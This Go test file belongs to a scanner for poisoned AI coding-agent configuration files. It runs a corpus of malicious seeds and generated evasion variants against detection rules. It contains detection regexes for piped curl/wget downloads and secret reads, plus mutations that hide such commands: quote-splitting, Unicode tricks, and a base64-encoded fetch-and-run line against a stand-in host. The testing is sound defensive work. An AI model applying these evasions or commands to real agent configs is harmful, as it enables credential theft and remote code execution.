package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"testing"

	"github.com/vgmartinez/tripcord/internal/corpus"
	"github.com/vgmartinez/tripcord/internal/exitcode"
	"github.com/vgmartinez/tripcord/internal/txtar"
)

// maliciousSources maps each corpus/malicious subdirectory to the public
// write-up its seeds reproduce. URLs stay here because the corpus lint
// rejects non-reserved hosts under corpus/.
var maliciousSources = map[string]string{
	"workos-npm-worm":  "https://workos.com/blog/npm-worm-coding-agent-config-credentials",
	"novee-sandbox":    "https://novee.security/blog/breaking-ai-agent-sandboxes/",
	"arxiv-2602.06547": "https://arxiv.org/abs/2602.06547",
}

// maliciousRules are the rule ids an archive may expect. TC-CFG-013 is
// documentation only and is never a finding.
var maliciousRules = []string{
	"TC-CFG-001", "TC-CFG-002", "TC-CFG-003", "TC-CFG-004", "TC-CFG-005", "TC-CFG-006",
	"TC-CFG-007", "TC-CFG-008", "TC-CFG-009", "TC-CFG-010", "TC-CFG-011", "TC-CFG-012",
	"TC-CFG-014",
}

type maliciousCase struct {
	id     string
	seed   string
	header map[string]string
	expect []string
	arc    *txtar.Archive
}

// TestMaliciousCorpus scans every seed under corpus/malicious and every
// mutation derived from it, and requires exactly the expected rule ids
// minus the misses tracked in corpus/malicious/GAPS.
func TestMaliciousCorpus(t *testing.T) {
	clearPrContextEnv(t)
	dir := filepath.Join(moduleRoot(t), "corpus", "malicious")
	seeds := loadMaliciousSeeds(t, dir)
	if len(seeds) == 0 {
		t.Fatal("no seeds under corpus/malicious")
	}
	cases := slices.Clone(seeds)
	for _, s := range seeds {
		for _, m := range maliciousMutations {
			if c, ok := mutate(s, m); ok {
				cases = append(cases, c)
			}
		}
	}
	lintGenerated(t, cases[len(seeds):])
	checkMutationsGolden(t, filepath.Join(dir, "mutations.golden"), cases[len(seeds):])

	gaps := loadGaps(t, filepath.Join(dir, "GAPS"))
	known := map[string]bool{}
	for _, c := range cases {
		known[c.id] = true
	}
	for id := range gaps {
		if !known[id] {
			t.Errorf("GAPS names unknown case %s", id)
		}
	}

	for _, c := range cases {
		t.Run(c.id, func(t *testing.T) {
			got := scanArchive(t, c.arc)
			if _, ok := c.header["pr-author"]; ok && prContextMatches(t, c) {
				got = append(got, "TC-CFG-014")
			}
			slices.Sort(got)
			want := slices.Clone(c.expect)
			for rule := range gaps[c.id] {
				if !slices.Contains(c.expect, rule) {
					t.Errorf("gap %s is not expected by this case", rule)
				}
				if slices.Contains(got, rule) {
					t.Errorf("stale gap: %s now fires; remove it from GAPS", rule)
				}
				want = slices.DeleteFunc(want, func(r string) bool { return r == rule })
			}
			// A seed's gap covers its mutations, which may still hit.
			if c.seed != c.id {
				for rule := range gaps[c.seed] {
					if !slices.Contains(got, rule) {
						want = slices.DeleteFunc(want, func(r string) bool { return r == rule })
					}
				}
			}
			if !slices.Equal(got, want) {
				t.Errorf("findings %v, want %v (expect %v minus GAPS)", got, want, c.expect)
			}
		})
	}
}

func loadMaliciousSeeds(t *testing.T, dir string) []maliciousCase {
	t.Helper()
	paths, err := filepath.Glob(filepath.Join(dir, "*", "*.txtar"))
	if err != nil {
		t.Fatal(err)
	}
	var out []maliciousCase
	for _, p := range paths {
		source := filepath.Base(filepath.Dir(p))
		id := source + "/" + strings.TrimSuffix(filepath.Base(p), ".txtar")
		if _, ok := maliciousSources[source]; !ok {
			t.Errorf("%s: unknown source directory %q", id, source)
			continue
		}
		data, err := os.ReadFile(p)
		if err != nil {
			t.Fatal(err)
		}
		arc := txtar.Parse(data)
		header := parseMaliciousHeader(t, id, arc.Comment)
		if header["source"] != source {
			t.Errorf("%s: source %q does not match its directory", id, header["source"])
		}
		for _, key := range []string{"cite", "pattern"} {
			if header[key] == "" {
				t.Errorf("%s: missing %s", id, key)
			}
		}
		expect, ok := header["expect"]
		if !ok {
			t.Errorf("%s: missing expect", id)
		}
		rules := strings.Fields(expect)
		for _, r := range rules {
			if !slices.Contains(maliciousRules, r) {
				t.Errorf("%s: expect names %s, outside TC-CFG-001..012 and 014", id, r)
			}
		}
		if len(rules) == 0 && header["uncovered"] == "" {
			t.Errorf("%s: an archive that expects nothing has to say what is uncovered", id)
		}
		_, pr := header["pr-author"]
		if pr != slices.Contains(rules, "TC-CFG-014") {
			t.Errorf("%s: TC-CFG-014 needs pr-author and pr-author needs TC-CFG-014", id)
		}
		slices.Sort(rules)
		out = append(out, maliciousCase{id: id, seed: id, header: header, expect: rules, arc: arc})
	}
	return out
}

func parseMaliciousHeader(t *testing.T, id string, comment []byte) map[string]string {
	t.Helper()
	header := map[string]string{}
	for line := range strings.Lines(string(comment)) {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		key, value, ok := strings.Cut(line, ":")
		if !ok {
			t.Errorf("%s: header line %q is not key: value", id, line)
			continue
		}
		if _, dup := header[key]; dup {
			t.Errorf("%s: duplicate header %s", id, key)
		}
		header[key] = strings.TrimSpace(value)
	}
	return header
}

// loadGaps reads tab-separated lines of case id, rule id, and reason.
func loadGaps(t *testing.T, path string) map[string]map[string]string {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	gaps := map[string]map[string]string{}
	for n, line := range strings.Split(strings.TrimSuffix(string(data), "\n"), "\n") {
		n++
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		fields := strings.SplitN(line, "\t", 3)
		if len(fields) != 3 || fields[2] == "" {
			t.Errorf("GAPS:%d: want case<TAB>rule<TAB>reason", n)
			continue
		}
		if gaps[fields[0]] == nil {
			gaps[fields[0]] = map[string]string{}
		}
		if _, dup := gaps[fields[0]][fields[1]]; dup {
			t.Errorf("GAPS:%d: duplicate %s %s", n, fields[0], fields[1])
		}
		gaps[fields[0]][fields[1]] = fields[2]
	}
	return gaps
}

func scanArchive(t *testing.T, arc *txtar.Archive) []string {
	t.Helper()
	root := txtar.Unpack(t, arc)
	if err := os.Mkdir(filepath.Join(root, ".git"), 0o700); err != nil {
		t.Fatal(err)
	}
	var stdout, stderr bytes.Buffer
	code := run([]string{"scan", "--format", "json", root}, &stdout, &stderr)
	if code != int(exitcode.OK) && code != int(exitcode.Findings) {
		t.Fatalf("scan exit %d\nstderr: %s\nstdout: %s", code, stderr.String(), stdout.String())
	}
	rules, diags := jsonRecords(t, stdout.String())
	for _, d := range diags {
		if d["incomplete"] == true {
			t.Fatalf("incomplete scan: %v", d)
		}
	}
	return rules
}

// prContextMatches commits the archive as a pull request authored as the
// header says, with no reviews, and reports whether TC-CFG-014 matched.
func prContextMatches(t *testing.T, c maliciousCase) bool {
	t.Helper()
	git := lookGit(t)
	login, kind, _ := strings.Cut(c.header["pr-author"], " ")
	name, email, ok := strings.Cut(strings.TrimSuffix(c.header["pr-commit-author"], ">"), " <")
	if login == "" || kind == "" || !ok {
		t.Fatalf("want pr-author: <login> <type> and pr-commit-author: <name> <<email>>")
	}
	repo := initRepo(t)
	base := strings.TrimSpace(gitOut(t, git, repo, "rev-parse", "HEAD"))
	runGitCmd(t, git, repo, "checkout", "-q", "-b", "feature/config")
	if err := txtar.Write(repo, c.arc); err != nil {
		t.Fatal(err)
	}
	runGitCmd(t, git, repo, "add", "-A")
	msg := c.header["pr-commit-message"]
	if trailer := c.header["pr-commit-trailer"]; trailer != "" {
		msg += "\n\n" + trailer + "\n"
	}
	cmd := exec.Command(git, "-c", "core.hooksPath=/dev/null", "commit", "-q", "-m", msg)
	cmd.Dir = repo
	cmd.Env = append(os.Environ(),
		"GIT_AUTHOR_NAME="+name, "GIT_AUTHOR_EMAIL="+email,
		"GIT_COMMITTER_NAME="+name, "GIT_COMMITTER_EMAIL="+email,
	)
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("commit: %v\n%s", err, out)
	}
	head := strings.TrimSpace(gitOut(t, git, repo, "rev-parse", "HEAD"))
	body := `{"pull_request":{"user":{"login":"` + login + `","type":"` + kind + `"},"head":{"ref":"feature/config","sha":"` + head + `"},"base":{"sha":"` + base + `"}},"reviews":[]}`
	code, stdout, stderr, output := runCfg014Args(t, repo, writeTemp(t, "event.json", body), "text")
	switch {
	case code == int(exitcode.Findings) && strings.Contains(output, "tc_cfg_014=match\n"):
		return true
	case code == int(exitcode.OK) && !strings.Contains(output, "tc_cfg_014=match"):
		return false
	}
	t.Fatalf("pr-context exit %d\nstderr: %s\nstdout: %s\noutput: %s", code, stderr, stdout, output)
	return false
}

var updateMutations = flag.Bool("update", false, "rewrite corpus/malicious/mutations.golden")

const mutationsGoldenHeader = "# Generated by go test ./cmd/tripcord -run TestMaliciousCorpus -update.\n" +
	"# One line per mutation: variant id, then the sha256 of the generated txtar archive.\n"

// checkMutationsGolden pins every generated variant and its content, so
// a mutation that stops applying or changes its output fails until the
// golden is regenerated with -update.
func checkMutationsGolden(t *testing.T, path string, mutations []maliciousCase) {
	t.Helper()
	lines := make([]string, 0, len(mutations))
	for _, c := range mutations {
		sum := sha256.Sum256(txtar.Format(c.arc))
		lines = append(lines, c.id+"\t"+hex.EncodeToString(sum[:]))
	}
	slices.Sort(lines)
	want := mutationsGoldenHeader + strings.Join(lines, "\n") + "\n"
	if *updateMutations {
		if err := os.WriteFile(path, []byte(want), 0o644); err != nil {
			t.Fatal(err)
		}
		return
	}
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("%v; regenerate with -update", err)
	}
	if string(raw) == want {
		return
	}
	golden := map[string]string{}
	for line := range strings.Lines(strings.TrimPrefix(string(raw), mutationsGoldenHeader)) {
		id, sum, _ := strings.Cut(strings.TrimSuffix(line, "\n"), "\t")
		golden[id] = sum
	}
	for _, line := range lines {
		id, sum, _ := strings.Cut(line, "\t")
		switch prev, ok := golden[id]; {
		case !ok:
			t.Errorf("mutations.golden is missing new variant %s", id)
		case prev != sum:
			t.Errorf("variant %s changed its output", id)
		}
		delete(golden, id)
	}
	for id := range golden {
		t.Errorf("variant %s in mutations.golden no longer applies", id)
	}
	t.Error("mutations.golden is out of date; regenerate with -update")
}

// lintGenerated holds mutations to the same defang lint as committed seeds.
func lintGenerated(t *testing.T, cases []maliciousCase) {
	t.Helper()
	dir := t.TempDir()
	for _, c := range cases {
		path := filepath.Join(dir, filepath.FromSlash(c.id)+".txtar")
		if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, txtar.Format(c.arc), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	findings, err := corpus.Check(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range findings {
		t.Errorf("generated %s: %s: %s", f.Path, f.Kind, f.Detail)
	}
}

// mutation rewrites member names and contents. add lists rule ids the
// mutation itself introduces, such as TC-CFG-011 for hidden characters.
type mutation struct {
	name   string
	add    []string
	only   func(name string) bool
	rename map[string]string
	edit   func(string) string
}

func isMarkdown(name string) bool { return strings.HasSuffix(name, ".md") }

func replacer(pairs ...string) func(string) string {
	return strings.NewReplacer(pairs...).Replace
}

// prose applies edit to Markdown text after any YAML frontmatter, so a
// Unicode mutation tests instruction reading rather than YAML parsing.
func prose(edit func(string) string) func(string) string {
	return func(s string) string {
		if rest, ok := strings.CutPrefix(s, "---\n"); ok {
			if i := strings.Index(rest, "\n---\n"); i >= 0 {
				head := len(s) - len(rest) + i + len("\n---\n")
				return s[:head] + edit(s[head:])
			}
		}
		return edit(s)
	}
}

var fetchPipe = regexp.MustCompile(`(curl|wget) [^|"]*\| *(sudo )?(ba)?sh`)

var secretLine = regexp.MustCompile(`(?m)^.*(\.env|environ|printenv|credentials|TOKEN).*$`)

var maliciousMutations = []mutation{
	{name: "quote-split", edit: replacer("curl ", "c'ur'l ", "wget ", "w'ge't ")},
	{name: "abs-path", edit: replacer(
		"curl ", "/usr/bin/curl ", "wget ", "/usr/bin/wget ",
		"| bash", "| /bin/bash", "| sh", "| /bin/sh",
		`"command": "bash"`, `"command": "/bin/bash"`, `"command": "sh"`, `"command": "/bin/sh"`,
	)},
	{name: "env-indirection", edit: replacer("curl ", "${TC_DL:-curl} ", "wget ", "${TC_DL:-wget} ")},
	{name: "base64", edit: func(s string) string {
		return fetchPipe.ReplaceAllString(s, "echo Y3VybCB4LmludmFsaWR8c2g= | base64 -d | sh")
	}},
	{name: "zero-width", add: []string{"TC-CFG-011"}, only: isMarkdown, edit: prose(replacer(".env", ".\u200benv"))},
	{name: "bidi", add: []string{"TC-CFG-011"}, only: isMarkdown, edit: prose(func(s string) string {
		return secretLine.ReplaceAllString(s, "\u202e$0\u202c")
	})},
	{name: "homoglyph", only: isMarkdown, edit: prose(replacer(".env", ".\u0435nv", "printenv", "print\u0435nv"))},
	{name: "alt-path", rename: map[string]string{
		"AGENTS.md": "services/api/AGENTS.md",
		"CLAUDE.md": ".claude/CLAUDE.md",
		".mcp.json": ".cursor/mcp.json",
	}},
	{name: "relative-path", edit: replacer(
		" .claude/", " ./.claude/../.claude/", " .vscode/", " ./.vscode/../.vscode/",
		"~/.aws/", "$HOME/.aws/", "~/.ssh/", "$HOME/.ssh/",
		"/proc/self/", "/proc/self/../self/",
	)},
}

// mutate applies m to every member it covers. It reports false when the
// mutation changes nothing, so inapplicable variants are skipped.
func mutate(c maliciousCase, m mutation) (maliciousCase, bool) {
	arc := &txtar.Archive{Comment: c.arc.Comment}
	changed := false
	for _, f := range c.arc.Files {
		name, data := f.Name, string(f.Data)
		if to, ok := m.rename[name]; ok {
			name = to
		}
		if m.edit != nil && (m.only == nil || m.only(f.Name)) {
			data = m.edit(data)
		}
		if name != f.Name || data != string(f.Data) {
			changed = true
		}
		arc.Files = append(arc.Files, txtar.File{Name: name, Data: []byte(data)})
	}
	if !changed {
		return maliciousCase{}, false
	}
	expect := slices.Clone(c.expect)
	for _, r := range m.add {
		if !slices.Contains(expect, r) {
			expect = append(expect, r)
		}
	}
	slices.Sort(expect)
	return maliciousCase{id: c.id + "~" + m.name, seed: c.seed, header: c.header, expect: expect, arc: arc}, true
}
